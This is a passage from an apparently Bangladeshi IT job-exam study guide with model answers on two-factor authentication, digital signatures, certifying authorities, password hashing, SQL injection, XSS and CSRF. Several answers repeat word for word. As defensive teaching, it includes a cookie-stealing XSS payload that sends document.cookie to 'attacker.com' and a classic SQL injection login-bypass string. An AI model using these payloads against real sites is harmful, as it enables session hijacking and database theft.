   - Secure development, code review and penetration testing; protection against the OWASP Top 10; a Web Application Firewall.
   - TLS 1.3 everywhere with HSTS, and encryption of data at rest.
   - Rate limiting and account lockout with progressive delay, and bot detection to stop credential stuffing.
   - Prompt patching, network segmentation, privileged access management and 24 hour monitoring with a SIEM.

   Customer and process controls:
   - Customer education about phishing, smishing and vishing, and a clear statement that the bank never asks for an OTP.
   - A rapid channel for reporting fraud, with the ability to freeze the account instantly from the application.
   - Dual authorisation for corporate accounts, so that one user initiates and another approves.
   - Regular review of dormant accounts and of registered devices.

   - The strategy in one sentence: replace the weakest link, which is the SMS OTP, with a phishing resistant possession factor and transaction signing; add risk based adaptive authentication and real time fraud analytics so that unusual behaviour is challenged; and back both with hardened applications, immediate notification and an informed customer.
7. **Difference between Digital signature and Digital certificate.** *[Sonali & Janata Bank Officer (IT) 14.10.2023 compact it 527 (ET: MIST)]*


   Answer:

   | Point | Digital signature | Digital certificate |
   |---|---|---|
   | What it is | A cryptographic value produced by signing a document with a private key | An electronic document that binds a public key to a verified identity |
   | Purpose | To prove who created the data and that it has not been altered | To prove that a particular public key genuinely belongs to a particular person or organisation |
   | Created by | The signer, using the signer's own private key | A Certifying Authority, which signs the certificate with its own private key |
   | Contains | A hash of the document encrypted with the private key | The subject's name, the public key, the validity period, the serial number, the issuer's name and the CA's signature |
   | Standard | RSA, DSA, ECDSA with SHA-256 | X.509 |
   | Provides | Authentication, integrity and non-repudiation of a message | Trust in the ownership of a public key |
   | Validity | Not applicable; it belongs to one document | Has an issue date and an expiry date, and can be revoked |
   | Relationship | It is verified using the public key found in the certificate | It is itself digitally signed by the Certifying Authority |
   | Analogy | The act of signing a document | The identity card that proves whose signature it is |

   - The relationship between them: a digital signature alone proves only that whoever holds a particular private key signed the document. It does not prove who that is. The digital certificate supplies that missing link by having a trusted third party vouch that the corresponding public key belongs to a named and verified entity. Without certificates, an attacker could generate a key pair, sign a document as someone else, and every verification would succeed.
   - Both are needed together, and both are part of a Public Key Infrastructure, which also includes the Registration Authority that verifies applicants and the revocation mechanism, that is the Certificate Revocation List or OCSP.
8. **How to work two factor authentication?** *[Mongla Port Authority Assistant Programmer 2023 compact it 574 (ET: N/A)]*


   Answer: Two factor authentication works by requiring the user to pass two independent checks, drawn from different categories of evidence, before access is granted.

   Step by step:
   - Step 1: the user enters the username and password, which is the first factor, something you know. If this fails, the process stops.
   - Step 2: the system verifies the password, but does not yet grant access. Instead it initiates the second factor challenge.
   - Step 3: the second factor is presented. Depending on the method: a one time password is sent by SMS or email; an authenticator application generates a six digit code from a shared secret and the current time; a push notification is sent to the registered device for approval; a hardware token displays a code; or a security key or fingerprint is used.
   - Step 4: the user supplies the second factor.
   - Step 5: the system verifies it, checking that the code matches and has not expired, that it has not already been used, and that the device is the registered one.
   - Step 6: only when both factors succeed is the session created and access granted. A failure at either stage denies access and is logged.

   How a time based one time password works, since it is the most common method:
   - When the user enrols, the server and the authenticator application share a secret key, usually transferred by scanning a QR code.
   - Both then compute a code as a function of that shared secret and the current time, in 30 second windows, using the HMAC based TOTP algorithm.
   - The code is therefore generated independently on both sides, never travels over the network, and expires within 30 seconds, so interception is nearly useless.

   ```mermaid
   sequenceDiagram
       participant U as User
       participant S as Server
       U->>S: Username and password, factor 1
       S->>S: Verify the password
       S->>U: Request the second factor
       U->>U: Read the OTP from the phone or the token
       U->>S: Submit the OTP, factor 2
       S->>S: Verify the OTP and check expiry
       S->>U: Access granted
   ```

   Security value and limits:
   - A stolen password alone is worthless, which prevents most account takeovers arising from phishing, breaches and reuse.
   - SMS is the weakest second factor, since it can be defeated by SIM swapping and by a real time phishing proxy that relays the code as it is typed. An authenticator application is better, push approval with number matching better still, and a FIDO2 security key is phishing resistant because it cryptographically verifies the site's domain.
9. **(b) How do you define 2 factor authentication? Give example.** *[BPSC (Multiple Ministry) Assistant Programmer (CSE) 19.07.2023 compact it 486 (ET: N/A)]*


   Answer:

   - Two factor authentication requires a user to present two different kinds of evidence of identity before access is granted, so that a stolen password alone is not sufficient.
   - The two factors must come from different categories. Two passwords, or a password and a security question, are both knowledge factors and therefore do not constitute two factor authentication.

   The three globally recognised categories of authentication factor:
   - Something you know: a password, a PIN, a passphrase or the answer to a security question.
   - Something you have: a mobile phone receiving an OTP, a hardware token, a smart card, a FIDO2 security key, or an authenticator application generating a time based code.
   - Something you are: a biometric characteristic such as a fingerprint, a face, an iris pattern or a voice print.
   - Two further categories are sometimes added: somewhere you are, that is location or IP based, and something you do, that is behavioural biometrics such as typing rhythm.

   Example:
   - A customer logs in to internet banking. She first types her username and password, which is something she knows. The bank then sends a six digit one time password by SMS to her registered mobile number and she enters it; that is something she has, since it proves possession of the phone. Access is granted only when both succeed.
   - A second example: withdrawing money from an ATM needs the card, which is something you have, and the PIN, which is something you know. This is the oldest and most familiar case of two factor authentication.
   - A third: unlocking a banking application with a fingerprint, which is something you are, on a device already registered to the account, which is something you have.

   Why it matters:
   - Passwords are stolen constantly through phishing, data breaches, reuse across sites and malware. A second factor means a stolen password alone gains nothing, which prevents the great majority of account takeovers.
   - Limitations worth stating: SMS one time passwords can be defeated by SIM swapping or by a real time phishing proxy, so stronger factors are preferred — an authenticator application, push approval with number matching, or best of all a FIDO2 hardware key, which is phishing resistant because it verifies the site's domain cryptographically.
10. **What is digital signature? Where is it used?** *[BPSC (Ministry of Home Affairs) Assistant Engineer 17.05.2022 compact it 635 (ET: N/A)]*


   Answer:

   - A digital signature is a cryptographic mechanism that proves who created an electronic message or document and that it has not been altered since it was signed.
   - It is not a scanned image of a handwritten signature; it is a mathematical value computed from the document itself together with the signer's private key.

   How it works:
   - Signing: the sender computes a hash of the document with an algorithm such as SHA-256, then encrypts that hash with the sender's own private key. The result is the digital signature, which is attached to the document.
   - Verification: the receiver decrypts the signature with the sender's public key to recover the hash, computes the hash of the received document independently, and compares the two. If they match, the document is authentic and unaltered.
   - The hash is signed rather than the whole document, because asymmetric encryption is slow and a fixed length digest is far cheaper to sign than a large file.

   ```mermaid
   graph LR
       A["Document"] --> B["Hash function SHA-256"]
       B --> C["Message digest"]
       C --> D["Encrypt with sender's PRIVATE key"]
       D --> E["Digital signature attached to the document"]
       E --> F["Receiver"]
       F --> G["Decrypt with sender's PUBLIC key -> digest 1"]
       F --> H["Hash the received document -> digest 2"]
       G --> I{"digest 1 = digest 2 ?"}
       H --> I
       I -->|Yes| J["Authentic and unaltered"]
       I -->|No| K["Reject"]
   ```

   What it provides:
   - Authentication: only the holder of the private key could have produced the signature.
   - Integrity: any change to the document, even of a single bit, invalidates the signature.
   - Non-repudiation: the signer cannot later deny having signed it.
   - It does not provide confidentiality; the document must be separately encrypted if it is also to be kept secret.

   Algorithms: RSA, DSA and ECDSA, with SHA-256 as the hash.
   Role of the Certifying Authority: the public key must be bound to a verified identity by a digital certificate issued by a trusted CA within a Public Key Infrastructure. Without it an attacker could publish a key in someone else's name and the signature would verify against the wrong identity.

   Where it is used:
   - TLS certificates that authenticate websites, and the HTTPS handshake.
   - Signed email with S/MIME and PGP.
   - Software and driver code signing, so the operating system trusts the publisher.
   - Legally valid electronic documents, e-tendering and e-procurement. In Bangladesh, digital signature certificates issued under the ICT Act give an electronically signed document the same legal standing as a handwritten signature.
   - Banking instructions, tax returns, land records and government file movement in e-Nothi.
   - Signing transactions in blockchain and cryptocurrency.
11. **What is a digital signature? Describe its role in digital security?** *[BPSC (Ministry of Agriculture) Assistant Programmer 15.02.2022 compact it 679 (ET: N/A)]*


   Answer:

   - A digital signature is a cryptographic mechanism that proves who created an electronic message or document and that it has not been altered since it was signed.
   - It is not a scanned image of a handwritten signature; it is a mathematical value computed from the document itself together with the signer's private key.

   How it works:
   - Signing: the sender computes a hash of the document with an algorithm such as SHA-256, then encrypts that hash with the sender's own private key. The result is the digital signature, which is attached to the document.
   - Verification: the receiver decrypts the signature with the sender's public key to recover the hash, computes the hash of the received document independently, and compares the two. If they match, the document is authentic and unaltered.
   - The hash is signed rather than the whole document, because asymmetric encryption is slow and a fixed length digest is far cheaper to sign than a large file.

   ```mermaid
   graph LR
       A["Document"] --> B["Hash function SHA-256"]
       B --> C["Message digest"]
       C --> D["Encrypt with sender's PRIVATE key"]
       D --> E["Digital signature attached to the document"]
       E --> F["Receiver"]
       F --> G["Decrypt with sender's PUBLIC key -> digest 1"]
       F --> H["Hash the received document -> digest 2"]
       G --> I{"digest 1 = digest 2 ?"}
       H --> I
       I -->|Yes| J["Authentic and unaltered"]
       I -->|No| K["Reject"]
   ```

   What it provides:
   - Authentication: only the holder of the private key could have produced the signature.
   - Integrity: any change to the document, even of a single bit, invalidates the signature.
   - Non-repudiation: the signer cannot later deny having signed it.
   - It does not provide confidentiality; the document must be separately encrypted if it is also to be kept secret.

   Algorithms: RSA, DSA and ECDSA, with SHA-256 as the hash.
   Role of the Certifying Authority: the public key must be bound to a verified identity by a digital certificate issued by a trusted CA within a Public Key Infrastructure. Without it an attacker could publish a key in someone else's name and the signature would verify against the wrong identity.

   Role in digital security:
   - Authentication of the origin: it establishes with cryptographic certainty who produced a message, a document or a piece of software. This underpins trust in every electronic transaction, because the parties usually never meet.
   - Integrity of the data: any alteration, however small, invalidates the signature, so a tampered instruction, contract or software update is detected before it is acted upon.
   - Non-repudiation: because only the signer holds the private key, the signer cannot later deny having signed. This is what makes an electronic contract or a banking instruction legally enforceable, and it is a property that neither a password nor a symmetric key can provide.
   - Trust in identity through certificates: combined with a Public Key Infrastructure, it allows a browser to be certain that it is talking to the genuine bank and not an imitation, which is the foundation of HTTPS and of all online commerce.
   - Software supply chain protection: code signing means an operating system will refuse to install an unsigned or altered driver or application, which blocks a whole class of malware.
   - Legal validity: under the ICT Act in Bangladesh, and equivalent laws elsewhere, a digitally signed document has the same standing as a handwritten signature, which is what makes paperless government and e-tendering possible.
   - Foundation of other systems: TLS, secure email, e-passports, blockchain transactions and government file movement all depend on it.

   Limitations to state: it does not provide confidentiality, so the document must be separately encrypted if secrecy is also required; its whole security rests on the private key remaining secret, so key theft is total compromise; and it depends on a trustworthy Certifying Authority, since a compromised CA can issue a valid certificate in someone else's name.
12. **What is Digital signature? Explain shortly.** *[Microcredit Regulatory Authority (MRA) Assistant Maintenance Engineer 2022 compact it 718 (ET: N/A)]*


   Answer:

   - A digital signature is a cryptographic mechanism that proves who created an electronic message or document and that it has not been altered since it was signed.
   - It is not a scanned image of a handwritten signature; it is a mathematical value computed from the document itself together with the signer's private key.

   How it works:
   - Signing: the sender computes a hash of the document with an algorithm such as SHA-256, then encrypts that hash with the sender's own private key. The result is the digital signature, which is attached to the document.
   - Verification: the receiver decrypts the signature with the sender's public key to recover the hash, computes the hash of the received document independently, and compares the two. If they match, the document is authentic and unaltered.
   - The hash is signed rather than the whole document, because asymmetric encryption is slow and a fixed length digest is far cheaper to sign than a large file.

   ```mermaid
   graph LR
       A["Document"] --> B["Hash function SHA-256"]
       B --> C["Message digest"]
       C --> D["Encrypt with sender's PRIVATE key"]
       D --> E["Digital signature attached to the document"]
       E --> F["Receiver"]
       F --> G["Decrypt with sender's PUBLIC key -> digest 1"]
       F --> H["Hash the received document -> digest 2"]
       G --> I{"digest 1 = digest 2 ?"}
       H --> I
       I -->|Yes| J["Authentic and unaltered"]
       I -->|No| K["Reject"]
   ```

   What it provides:
   - Authentication: only the holder of the private key could have produced the signature.
   - Integrity: any change to the document, even of a single bit, invalidates the signature.
   - Non-repudiation: the signer cannot later deny having signed it.
   - It does not provide confidentiality; the document must be separately encrypted if it is also to be kept secret.

   Algorithms: RSA, DSA and ECDSA, with SHA-256 as the hash.
   Role of the Certifying Authority: the public key must be bound to a verified identity by a digital certificate issued by a trusted CA within a Public Key Infrastructure. Without it an attacker could publish a key in someone else's name and the signature would verify against the wrong identity.

   In short: the sender hashes the document and encrypts the hash with the private key to create the signature; the receiver decrypts it with the public key and compares it with a freshly computed hash. A match proves both who sent it and that nothing was changed.

   Where it is used:
   - TLS certificates that authenticate websites, and the HTTPS handshake.
   - Signed email with S/MIME and PGP.
   - Software and driver code signing, so the operating system trusts the publisher.
   - Legally valid electronic documents, e-tendering and e-procurement. In Bangladesh, digital signature certificates issued under the ICT Act give an electronically signed document the same legal standing as a handwritten signature.
   - Banking instructions, tax returns, land records and government file movement in e-Nothi.
   - Signing transactions in blockchain and cryptocurrency.
13. **(খ) Authentication বলতে কি বুঝায়? Two Factor Authenticating কি? উদাহরণসহ ব্যাখ্যা করুন।** *[BPSC Assistant Programmer (ICT Ministry) 2021 compact it 769 (ET: N/A)]*


   Answer:

   What authentication means:
   - Authentication is the process of verifying that a user, device or system is genuinely who or what it claims to be, before access is granted.
   - It is distinct from the two related terms with which it is often confused: identification is the claim of an identity, that is presenting a username; authentication is the proof of that claim; and authorisation is what the authenticated identity is then permitted to do. Accounting or auditing then records what was actually done.
   - Methods: passwords and PINs; one time passwords; digital certificates; biometrics; hardware tokens and smart cards; and single sign on protocols such as Kerberos, SAML and OAuth.

   - Two factor authentication requires a user to present two different kinds of evidence of identity before access is granted, so that a stolen password alone is not sufficient.
   - The two factors must come from different categories. Two passwords, or a password and a security question, are both knowledge factors and therefore do not constitute two factor authentication.

   The three globally recognised categories of authentication factor:
   - Something you know: a password, a PIN, a passphrase or the answer to a security question.
   - Something you have: a mobile phone receiving an OTP, a hardware token, a smart card, a FIDO2 security key, or an authenticator application generating a time based code.
   - Something you are: a biometric characteristic such as a fingerprint, a face, an iris pattern or a voice print.
   - Two further categories are sometimes added: somewhere you are, that is location or IP based, and something you do, that is behavioural biometrics such as typing rhythm.

   Example:
   - A customer logs in to internet banking. She first types her username and password, which is something she knows. The bank then sends a six digit one time password by SMS to her registered mobile number and she enters it; that is something she has, since it proves possession of the phone. Access is granted only when both succeed.
   - A second example: withdrawing money from an ATM needs the card, which is something you have, and the PIN, which is something you know. This is the oldest and most familiar case of two factor authentication.
   - A third: unlocking a banking application with a fingerprint, which is something you are, on a device already registered to the account, which is something you have.

   Why it matters:
   - Passwords are stolen constantly through phishing, data breaches, reuse across sites and malware. A second factor means a stolen password alone gains nothing, which prevents the great majority of account takeovers.
   - Limitations worth stating: SMS one time passwords can be defeated by SIM swapping or by a real time phishing proxy, so stronger factors are preferred — an authenticator application, push approval with number matching, or best of all a FIDO2 hardware key, which is phishing resistant because it verifies the site's domain cryptographically.
14. **(b) Write down the purpose of Certification Authority (CA) in Digital Signature.** *[BPSC Sub-Assistant Engineer (Ministry of Agriculture) 2021 compact it 797 (ET: N/A)]*


   Answer: A Certification Authority, CA, is the trusted third party that issues digital certificates, and its purpose is to solve the problem that a digital signature alone cannot solve: proving whose public key it is.

   The problem it solves:
   - A digital signature proves only that whoever holds a particular private key signed the document. It says nothing about who that person is. Anyone can generate a key pair and claim to be a bank. Without a trusted authority to vouch for the binding between a public key and a real identity, the whole system is open to impersonation.

   Purposes of a Certification Authority:
   - Identity verification: before issuing a certificate the CA, through its Registration Authority, verifies the applicant's identity against legal documents. This is the step that gives the certificate its value.
   - Issuing certificates: it creates an X.509 certificate containing the subject's name, the public key, the validity period, the serial number, the intended uses and the issuer's details.
   - Signing the certificate with its own private key: this is what makes the certificate tamper evident and verifiable. Anyone who trusts the CA can verify the certificate and therefore trust the public key inside it.
   - Establishing the chain of trust: a root CA signs intermediate CAs, which sign end entity certificates. Browsers and operating systems ship with the root certificates pre-installed, which is why a certificate is validated automatically without any prior arrangement between the user and the website.
   - Revocation: when a private key is compromised, an employee leaves or details change, the CA revokes the certificate and publishes the fact through a Certificate Revocation List or through OCSP, so that relying parties stop trusting it before its expiry date.
   - Managing the certificate lifecycle: issue, renewal, suspension, revocation and expiry, together with the validity period that limits the damage of an undetected compromise.
   - Publishing a repository of certificates and a Certificate Practice Statement, which states the rules under which it operates and against which it can be audited.
   - Enabling non-repudiation in law: because the CA verified the identity, a signature made with that certificate can be attributed to a named person, which is what makes an electronic signature legally enforceable.

   In Bangladesh:
   - The Controller of Certifying Authorities, under the ICT Division, licenses and supervises the Certifying Authorities, and a certificate issued by a licensed CA gives a digitally signed document the same legal standing as a handwritten signature under the ICT Act.

   - Risk to state for balance: the CA is a single point of trust. If a CA is compromised or negligent, valid certificates can be issued for domains the attacker does not own, as happened with DigiNotar in 2011. Certificate Transparency logs and certificate pinning exist to detect exactly this.
15. **১৮. পাসওয়ার্ড সুরক্ষা জন্য যে পদ্ধতি ব্যবহার করা হয় তার নাম কী?** *[BPSC Ministry of Women and Children Affairs Assistant Programmer (CSE) 2021 compact it 942 (ET: N/A)]*


   Answer: The method used to protect passwords is hashing, and specifically salted hashing with a deliberately slow algorithm.

   How it works:
   - The password is never stored. When a user sets a password, the system generates a random value called a salt, appends it to the password, and passes the result through a one way hash function. Only the salt and the resulting digest are stored.
   - When the user logs in, the same salt is fetched, the same computation is performed on the entered password, and the two digests are compared. The system therefore verifies the password without ever knowing it.
   - Because hashing is one way, an attacker who steals the database cannot reverse the digests to recover the passwords.

   Why the salt is essential:
   - Without a salt, two users with the same password would have identical digests, which is immediately visible in a stolen database.
   - A salt also defeats precomputed attacks, that is rainbow tables, because the attacker would need a separate table for every possible salt. The salt is unique per user and need not be secret; it only needs to be unpredictable.

   Why the algorithm must be slow:
   - General purpose hash functions such as SHA-256 are designed to be fast, so an attacker with a GPU can test billions of candidate passwords per second against a stolen digest.
   - Password hashing algorithms are therefore deliberately slow and memory intensive: bcrypt, scrypt, PBKDF2 and Argon2, which is the current recommendation. A configurable work factor allows the cost to be raised as hardware improves.
   - Some systems add a pepper, a secret value stored separately from the database, so that a stolen database alone is insufficient.

   Supporting measures:
   - Transmission over TLS so the password is never sent in clear.
   - A password policy on length and complexity, and checking against lists of known breached passwords.
   - Account lockout or progressive delay against brute force, and rate limiting.
   - Multi-factor authentication, so that even a recovered password is not enough.
   - Never storing passwords encrypted rather than hashed: encryption is reversible, so whoever obtains the key obtains every password. Hashing is the correct method precisely because it cannot be reversed.

## Web Security Vulnerabilities (15)

1. Describe the SQL Injection and Cross-Site Scripting (XSS) web security threats and suggest preventive measures for each. *[Officer (IT) 31 Jul 2026 bscs 02 (ET: N/A)]*


   Answer:

   SQL Injection:

   - SQL injection is an attack in which the attacker inserts malicious SQL code through an application input field, so that the database executes it as though it were part of the intended query.
   - Root cause: the application builds a query by concatenating user input into a string, so the database cannot distinguish the developer's code from the user's data.

   How it is launched:
   - Step 1: the attacker finds an input that reaches the database — a login form, a search box, a URL parameter, a cookie or an HTTP header.
   - Step 2: he tests it by entering a single quote and observing whether a database error appears, which reveals that the input is being concatenated into a query.
   - Step 3: he crafts input that changes the meaning of the query.
   - Step 4: he escalates from bypassing a login to reading the schema and then extracting entire tables.

   Classic example:
   - The login query is written as `SELECT * FROM users WHERE username = '<input>' AND password = '<input>'`.
   - The attacker types `' OR '1'='1' --` as the username. The query becomes `SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'`.
   - The condition `'1'='1'` is always true and the `--` comments out the rest, so the password check disappears entirely and the attacker logs in as the first user in the table, often the administrator.

   Types:
   - In-band: the result is returned in the page itself, either through error messages or through a UNION SELECT that appends data from another table.
   - Blind: nothing is displayed, so the attacker infers data one bit at a time from whether the page behaves differently for a true or a false condition.
   - Time based blind: the attacker injects a deliberate delay, for example `IF(condition, SLEEP(5), 0)`, and measures the response time.
   - Out of band: the database is made to open a network connection to a server the attacker controls.
   - Second order: the malicious input is stored harmlessly and executed later by a different query.

   Impact:
   - Authentication bypass, reading the entire database including passwords and personal data, altering or deleting records, reading files from the server, and in some configurations executing operating system commands and taking over the host. It has caused many of the largest data breaches on record.

   Prevention:
   - Parameterised queries, that is prepared statements with bound parameters. This is the definitive fix, because the query structure is sent to the database separately from the data, so input can never be interpreted as code. Everything else is secondary.
   - Stored procedures, provided that they too avoid building dynamic SQL from the input.
   - Object relational mapping frameworks, which parameterise by default, though raw query methods within them must still be used carefully.
   - Input validation and whitelisting: accept only the expected type, length, format and range, and reject anything else. Escaping special characters is a weak secondary measure and must never be the only defence.
   - Least privilege for the database account: the application should have no rights to drop tables, read system catalogues or access the file system, so that even a successful injection is limited.
   - Generic error messages: database errors must never be returned to the user, since error based injection depends on them.
   - Disable or restrict dangerous database features such as `xp_cmdshell`.
   - A Web Application Firewall as a compensating control while the code is being fixed, not as a substitute for fixing it.
   - Regular code review, static analysis and penetration testing, and keeping the database and framework patched.
   - Encrypt or hash sensitive columns, so that stolen data is of reduced value.

   Cross Site Scripting:

   - Cross Site Scripting is an attack in which the attacker injects a malicious script into a web page, so that the script executes in the browser of another user who views that page. The victim's browser trusts the script because it appears to come from the legitimate site.
   - Root cause: the application includes user supplied data in its output without properly encoding it, so the data is interpreted as HTML or JavaScript rather than as text.

   Types:
   - Stored, or persistent, XSS: the script is saved on the server, in a comment, a profile field or a message, and executes for every user who views that content. This is the most damaging form.
   - Reflected XSS: the script is contained in a crafted URL and is echoed straight back in the response. The victim must be tricked into clicking the link, so it is usually combined with phishing.
   - DOM based XSS: the flaw is entirely in the client side JavaScript, which writes untrusted data into the page through `innerHTML` or a similar sink. The server may never see the payload at all.

   Example:
   - A comment field stores whatever is typed and displays it without encoding. The attacker posts `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`. Every subsequent visitor's browser runs it and sends their session cookie to the attacker, who then hijacks their session.

   Impact:
   - Session hijacking through cookie theft, and therefore full account takeover.
   - Credential theft by injecting a fake login form into the genuine page.
   - Defacement, redirection to a malicious site, and delivery of malware.
   - Keylogging within the page, and performing actions as the victim, which combines with CSRF.
   - It attacks the users of the site rather than the site's server, which is why it is easy to underestimate.

   Prevention:
   - Output encoding, which is the primary fix: encode all untrusted data according to the context in which it is placed — HTML body, HTML attribute, JavaScript, URL or CSS — so that it is rendered as text rather than executed. `<` becomes `&lt;` and so on.
   - Use a framework that encodes by default, such as React, Angular or Django templates, and avoid the escape hatches such as `dangerouslySetInnerHTML` and `innerHTML`.
   - Input validation and whitelisting of the expected format, as a complementary rather than a primary measure.
   - Content Security Policy: an HTTP header that tells the browser which script sources are permitted and forbids inline scripts, which blocks most injected payloads even if one gets through.
   - `HttpOnly` on session cookies, so that JavaScript cannot read them and cookie theft fails; and `Secure` and `SameSite` attributes as well.
   - Sanitise rich text with a proven library such as DOMPurify where users must be allowed to submit HTML.
   - `X-Content-Type-Options: nosniff` and correct content types, so that the browser does not guess and execute.
   - Regular code review, static analysis and penetration testing, and a Web Application Firewall as a compensating control.
2. Explain the vulnerability of SQL Injection. How can it be prevented? *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*


   Answer:

   - SQL injection is an attack in which the attacker inserts malicious SQL code through an application input field, so that the database executes it as though it were part of the intended query.
   - Root cause: the application builds a query by concatenating user input into a string, so the database cannot distinguish the developer's code from the user's data.

   How it is launched:
   - Step 1: the attacker finds an input that reaches the database — a login form, a search box, a URL parameter, a cookie or an HTTP header.
   - Step 2: he tests it by entering a single quote and observing whether a database error appears, which reveals that the input is being concatenated into a query.
   - Step 3: he crafts input that changes the meaning of the query.
   - Step 4: he escalates from bypassing a login to reading the schema and then extracting entire tables.

   Classic example:
   - The login query is written as `SELECT * FROM users WHERE username = '<input>' AND password = '<input>'`.
   - The attacker types `' OR '1'='1' --` as the username. The query becomes `SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'`.
   - The condition `'1'='1'` is always true and the `--` comments out the rest, so the password check disappears entirely and the attacker logs in as the first user in the table, often the administrator.

   Types:
   - In-band: the result is returned in the page itself, either through error messages or through a UNION SELECT that appends data from another table.
   - Blind: nothing is displayed, so the attacker infers data one bit at a time from whether the page behaves differently for a true or a false condition.
   - Time based blind: the attacker injects a deliberate delay, for example `IF(condition, SLEEP(5), 0)`, and measures the response time.
   - Out of band: the database is made to open a network connection to a server the attacker controls.
   - Second order: the malicious input is stored harmlessly and executed later by a different query.

   Impact:
   - Authentication bypass, reading the entire database including passwords and personal data, altering or deleting records, reading files from the server, and in some configurations executing operating system commands and taking over the host. It has caused many of the largest data breaches on record.

   Prevention:
   - Parameterised queries, that is prepared statements with bound parameters. This is the definitive fix, because the query structure is sent to the database separately from the data, so input can never be interpreted as code. Everything else is secondary.
   - Stored procedures, provided that they too avoid building dynamic SQL from the input.
   - Object relational mapping frameworks, which parameterise by default, though raw query methods within them must still be used carefully.
   - Input validation and whitelisting: accept only the expected type, length, format and range, and reject anything else. Escaping special characters is a weak secondary measure and must never be the only defence.
   - Least privilege for the database account: the application should have no rights to drop tables, read system catalogues or access the file system, so that even a successful injection is limited.
   - Generic error messages: database errors must never be returned to the user, since error based injection depends on them.
   - Disable or restrict dangerous database features such as `xp_cmdshell`.
   - A Web Application Firewall as a compensating control while the code is being fixed, not as a substitute for fixing it.
   - Regular code review, static analysis and penetration testing, and keeping the database and framework patched.
   - Encrypt or hash sensitive columns, so that stolen data is of reduced value.
3. **What is Cross site script and SQL injection?** *[Islami Bank PLC Quality Assurance (QA) Engineer 14.03.2025 compact it 1333 (ET: BUET)]*


   Answer:

   Cross Site Scripting:

   - Cross Site Scripting is an attack in which the attacker injects a malicious script into a web page, so that the script executes in the browser of another user who views that page. The victim's browser trusts the script because it appears to come from the legitimate site.
   - Root cause: the application includes user supplied data in its output without properly encoding it, so the data is interpreted as HTML or JavaScript rather than as text.

   Types:
   - Stored, or persistent, XSS: the script is saved on the server, in a comment, a profile field or a message, and executes for every user who views that content. This is the most damaging form.
   - Reflected XSS: the script is contained in a crafted URL and is echoed straight back in the response. The victim must be tricked into clicking the link, so it is usually combined with phishing.
   - DOM based XSS: the flaw is entirely in the client side JavaScript, which writes untrusted data into the page through `innerHTML` or a similar sink. The server may never see the payload at all.

   Example:
   - A comment field stores whatever is typed and displays it without encoding. The attacker posts `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`. Every subsequent visitor's browser runs it and sends their session cookie to the attacker, who then hijacks their session.

   Impact:
   - Session hijacking through cookie theft, and therefore full account takeover.
   - Credential theft by injecting a fake login form into the genuine page.
   - Defacement, redirection to a malicious site, and delivery of malware.
   - Keylogging within the page, and performing actions as the victim, which combines with CSRF.
   - It attacks the users of the site rather than the site's server, which is why it is easy to underestimate.

   SQL Injection:

   - SQL injection is an attack in which the attacker inserts malicious SQL code through an application input field, so that the database executes it as though it were part of the intended query.
   - Root cause: the application builds a query by concatenating user input into a string, so the database cannot distinguish the developer's code from the user's data.

   How it is launched:
   - Step 1: the attacker finds an input that reaches the database — a login form, a search box, a URL parameter, a cookie or an HTTP header.
   - Step 2: he tests it by entering a single quote and observing whether a database error appears, which reveals that the input is being concatenated into a query.
   - Step 3: he crafts input that changes the meaning of the query.
   - Step 4: he escalates from bypassing a login to reading the schema and then extracting entire tables.

   Classic example:
   - The login query is written as `SELECT * FROM users WHERE username = '<input>' AND password = '<input>'`.
   - The attacker types `' OR '1'='1' --` as the username. The query becomes `SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'`.
   - The condition `'1'='1'` is always true and the `--` comments out the rest, so the password check disappears entirely and the attacker logs in as the first user in the table, often the administrator.

   Types:
   - In-band: the result is returned in the page itself, either through error messages or through a UNION SELECT that appends data from another table.
   - Blind: nothing is displayed, so the attacker infers data one bit at a time from whether the page behaves differently for a true or a false condition.
   - Time based blind: the attacker injects a deliberate delay, for example `IF(condition, SLEEP(5), 0)`, and measures the response time.
   - Out of band: the database is made to open a network connection to a server the attacker controls.
   - Second order: the malicious input is stored harmlessly and executed later by a different query.

   Impact:
   - Authentication bypass, reading the entire database including passwords and personal data, altering or deleting records, reading files from the server, and in some configurations executing operating system commands and taking over the host. It has caused many of the largest data breaches on record.

   Difference in one line: SQL injection attacks the database behind the site and is executed by the server; cross site scripting attacks the users of the site and is executed by their browsers.
4. **What is CSRF attack?** *[Islami Bank PLC Quality Assurance (QA) Engineer 14.03.2025 compact it 1333 (ET: BUET)]*


   Answer:

   - Cross Site Request Forgery is an attack in which a victim, who is already authenticated to a site, is tricked into submitting a request to that site without intending to. The site executes it because the browser automatically attaches the victim's session cookie.
   - Root cause: the application authenticates the request by the presence of a session cookie alone, and cannot tell whether the user actually intended the action.

   How it works:
   - Step 1: the victim logs in to the bank and receives a session cookie.
   - Step 2: without logging out, the victim visits a malicious page, reached through a link in an email or an advertisement.
   - Step 3: that page contains a hidden form or an image tag that issues a request to the bank, for example a transfer to the attacker's account, and submits it automatically with JavaScript.
   - Step 4: the browser sends the request together with the victim's cookie, because cookies are attached to any request to that domain.
   - Step 5: the bank sees a properly authenticated request and executes the transfer.
   - The victim sees nothing. The attacker cannot read the response, but does not need to, because the damage is done by the request itself.

   Impact: unauthorised fund transfer, change of email address or password, change of delivery address, posting content as the victim, and in an administrative account, creating a new administrator.

   Prevention:
   - Anti-CSRF token, the synchroniser token pattern, which is the primary fix: the server places a random unpredictable token in every form, and rejects any request that does not carry the matching token. The attacker's page cannot read the token, because the same origin policy prevents it.
   - `SameSite` cookie attribute set to `Lax` or `Strict`, which instructs the browser not to send the session cookie with cross site requests. Modern browsers now default to `Lax`, which removes much of the risk automatically.
   - Re-authentication or a second factor for sensitive operations such as a transfer or a password change.
   - Verify the `Origin` and `Referer` headers on state changing requests.
   - Use POST rather than GET for anything that changes state, and never allow a state change through a simple URL.
   - Short session timeouts, and encouraging users to log out.
   - Custom request headers for API calls, which cross origin forms cannot set.
   - CAPTCHA on particularly sensitive actions.
5. **What is CSRF and XSS?** *[DESCO Sub-Assistant Engineer 20.06.2025 compact it 1361 (ET: BUET)]*


   Answer:

   CSRF, Cross Site Request Forgery:

   - Cross Site Request Forgery is an attack in which a victim, who is already authenticated to a site, is tricked into submitting a request to that site without intending to. The site executes it because the browser automatically attaches the victim's session cookie.
   - Root cause: the application authenticates the request by the presence of a session cookie alone, and cannot tell whether the user actually intended the action.

   How it works:
